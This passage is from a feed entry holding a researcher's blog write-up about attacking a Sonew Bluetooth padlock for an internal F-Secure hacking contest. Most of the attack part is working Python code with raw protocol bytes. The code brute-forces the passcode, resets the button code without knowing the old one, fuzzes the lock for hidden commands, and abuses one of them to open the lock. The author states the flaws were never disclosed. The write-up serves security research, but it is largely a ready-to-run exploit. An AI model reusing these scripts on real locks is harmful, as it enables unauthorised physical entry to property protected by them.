    else :
        padding = str(i)
    code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] &amp;gt; 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False)
    print(padding + &quot; &quot; + code)

def handle_data(handle, value):
    response = hexlify(value)
    if &quot;e0f0000e&quot; in str(response):
        print(&quot;Received repsonse (%s)&quot; % str(response))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;the-competition&quot;&gt;The Competition&lt;/h2&gt;

&lt;p&gt;After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/lznGZaM2G6M&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image6.jpg&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image4.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image5.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;disclosure-and-files&quot;&gt;Disclosure and Files&lt;/h2&gt;

&lt;p&gt;There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working.&lt;/p&gt;

&lt;p&gt;Files for this research are here: &lt;a href=&quot;https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/&quot;&gt;https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="research" /><category term="research" /><category term="story" /><summary type="html">In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard: The competition took place in the UK, and I was allowed 3 attempts within 15 minutes to unlock the lock via Bluetooth or physical entry without breaking the lock. I opted to attack the lock via Bluetooth. Attack Surface Inside the lock: Some features of the lock: Communicated over Bluetooth with a physical 4 directional button unlock option If you use Bluetooth, you need to know the lock’s 6 digit passcode The phone can store this passcode for easy access The Android app contained some information about how to communicate with the lock via Bluetooth. After some reverse engineering, the following commands were discovered. Unlock the lock The bytes below can be used to unlock the lock. Bytes 1-4 were O P E N in HEX: 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD Lock the lock THe bytes below can be used to lock the lock. Bytes 1-5 were C L O S E in HEX: 0xFE, 0x43, 0x4C, 0x4F, 0x53, 0x45, 0x00, 0x00, 0x00, 0xFD Send passcode The bytes below can be used to send the lock passcode. Bytes 1-6 were characters 0x00 through 0x09 to represent 1-9: 0x29, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x28 If the passcode was correct, the lock would respond with the following bytes: 0x59 0xf0 0x00 0x95 Change passcode The bytes below can be used to change the lock passcode. Bytes 1-6 were the old passcode, bytes 7-12 were the new passcode: 0x28 0x00 0x00 0x00 0x01 0x02 0x03 0x09 0x09 0x09 0x09 0x09 0x09 0x29 If the old passcode was correct, the lock would respond with the following bytes: 0x58 0xf0 0x00 0x95 Change 4 directional button code The following bytes can be used to change the 4 directional button code. Bytes 1-6 were the old code, bytes 7-12 were the new code, characters 0x01-0x04 were used to represent up/down/left/right respectively: 0xff 0x01 0x02 0x01 0x02 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe If the old button code was correct, the lock would respond with the following bytes: 0x60 0xf0 0x00 0x95 Brute Force Option The lock did not have any form of lock out functionality, making brute forcing the lock code a viable attack path. My immidate thought was “This is a great idea!” followed by “No wait this is a stupid idea. Oh well lets make a PoC and see what happens”. So the first script was created: def guess_password_method(i): password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28]) open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD]) if len(str(i)) &amp;lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: password_code[i2+1] = temp_code[i2] i2 = i2 + 1 #if i % 100 == 0: # print(&apos;sending 0xff 0x00 0xff&apos;) # device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, bytearray([0xFF, 0x00, 0xFF])) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, password_code) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, open_code) yay = padding + &quot; &quot; + code return yay def handle_data(handle, value): response = hexlify(value) if &quot;59f00095&quot; in str(response): print(&quot;Received &apos;guess password success&apos; repsonse (%s)&quot; % str(response)) As you can probably guess, while this worked, the amount of time to brute force the passcode was obsurd…like over 24 hours to brute force the lock. Obviously does not qualify as a valid entry. But what happens if we instead brute force the 4 directional button code: def change_physical_method(i): # ff xx xx xx xx xx xx yy yy yy yy yy yy fe physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to &quot;changed physical code&quot; if len(str(i)) &amp;lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &amp;gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) # 60 f0 00 95 if &quot;60f00095&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) This method took a maximum of 4 minutes. Much better and easily within the alloted time for the competition. Hidden Command At this point the competition was still like 2 months away, so I decided to do something even more stupid: try to brute force any hidden commands in the lock. What I noticed during this research is that the lock always responded with something if you send it a valid command over Bluetooth. And based on what was enumerated so far, a “valid command” looks like the following: 0xXX - beginning byte |__0xYY 0xYY 0xYY 0xYY - some data |__0xZZ - end byte For example, sending the real OPEN command 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD would result in the lock responding with some bytes, but sending a different payload, such as 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFE would result in the lock not sending any data back. Additionally, the middle data must be the correct length. For example, sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD is a valid command, but sending 0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0xFD is not a valid command. The lock also stopped all communications if the payload was over 20 bytes. So in theory, a valid payload would look like: 1 byte at the beginning Anywhere between 1 and 18 bytes for the middle data 1 byte at the end So lets make a script which will attempt to find additional commands within the above parameters: import pygatt from binascii import hexlify import sys import math from concurrent import futures import random import time adapter = pygatt.backends.GATTToolBackend(&apos;hci0&apos;) def handle_data(handle, value): response = hexlify(value) print(&quot;Received repsonse (%s)&quot; % str(response)) def decimal_to_hexadecimal(dec): decimal = int(dec) return hex(decimal) def fuzz_function(payload1, payload2, paddingCounter): #create temp code temp_code_length = paddingCounter + 2 temp_code_array = bytearray(temp_code_length) #create byte array payload temp_code_array[0] = payload1 temp_code_array[temp_code_length - 1] = payload2 #temp_code_array[temp_code_length] print(&quot;Payload1: %s, PaddingCounter: %s, Payload2: %s&quot; % (payload1, paddingCounter, payload2)) device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, temp_code_array) adapter.start() device = adapter.connect(&apos;28:EC:9A:09:C7:2B&apos;) device.subscribe(&quot;0000ffd4-0000-1000-8000-00805f9b34fb&quot;,callback=handle_data, wait_for_response=False) device.subscribe(&quot;0000ffdf-0000-1000-8000-00805f9b34fb&quot;, indication=False, wait_for_response=True) payload1 = 0 paddingCounter = 1 # modify payload 2 payload2 = 0 while payload2 != 256: while paddingCounter != 19: fuzz_function(payload1, payload2, paddingCounter) paddingCounter = paddingCounter + 1 paddingCounter = 1 payload2 = payload2 + 1 adapter.stop() This script was used against 2 different locks at the same time, and I went through like 10 batteries. It took 2 months to completely fuzz all possible commands, and that includes the amount of times the locks randomly decided to just disconnect. Thankfully some hidden commands were found: 0xC9 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x9C 0xEF 0xXX 0xXX 0xXX 0xXX 0xF1 0xFD 0xXX 0xXX 0xXX 0xXX 0xFC I have no idea what the last two commands do, but I did figure out what the first command does: send physical code. So we now have another viable entry for the competition: def guess_physical_method(i): physical_code = bytearray([0xc9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c]) # changed to &quot;send physical code&quot; if len(str(i)) &amp;lt; 6: padding = &quot;0&quot; * (6 - (int(len(str(i))))) padding += str(i) else : padding = str(i) code = padding[:0] + &apos;0&apos; + padding[0:1] + &apos;0&apos; + padding[1:2] + &apos;0&apos; + padding[2:3] + &apos;0&apos; + padding[3:4] + &apos;0&apos; + padding[4:5] + &apos;0&apos; + padding[5:6] temp_code = bytearray.fromhex(code) i2 = 0 while i2 != 6: if temp_code[i2] == 0: return if temp_code[i2] &amp;gt; 4: return physical_code[i2+1] = temp_code[i2] i2 = i2 + 1 device.char_write(&quot;0000ffd9-0000-1000-8000-00805f9b34fb&quot;, physical_code, wait_for_response=False) print(padding + &quot; &quot; + code) def handle_data(handle, value): response = hexlify(value) if &quot;e0f0000e&quot; in str(response): print(&quot;Received repsonse (%s)&quot; % str(response)) The Competition After I had finished brute forcing all of the commands, I still had some time before the competition. So I wanted to do something fun…such as programming a robot to brute force the lock for me: Unfortunatley the competition layout was a giant counter, and having my little bot wonder around the counter with all the gadgets wasn’t the best idea. So it just stood there while it hacked for me: Disclosure and Files There was none lol. One week after the competition, the world went into lockdown and our office became more focused on trying to adjust to remote working. Files for this research are here: https://github.com/Yogehi/Sonew-Bluetooth-Lock-Scripts/</summary></entry></feed>